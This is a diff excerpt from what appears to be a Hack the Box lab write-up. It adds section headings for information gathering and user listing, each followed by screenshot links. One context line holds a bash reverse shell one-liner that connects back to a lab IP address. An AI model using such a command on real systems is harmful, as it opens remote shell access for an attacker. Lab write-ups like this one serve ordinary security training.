@@ -131,3 +131,11 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 bash -c 'bash -i >& /dev/tcp/10.10.14.85/9001 0>&1'
 ```
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/2a984763-6024-4ff5-b6f8-f37a64b505f7)
+# Searching for Info
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/509032b0-9215-4e5c-bf8b-455c1c7094e3)
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/ec3a54d8-6cb2-4fb2-a7cb-7fed9f81c1d4)
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/881c6f7d-590c-4624-99dc-de223e6d9169)
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/4e8fcdc6-55e1-45f8-ae8f-8f76dd7ded72)
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/973201b0-4f2b-42e8-95c5-af98ede1c6d2)
+# List of Users
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/bf5fe75b-fcff-4f91-bbf2-115df6a5d616)
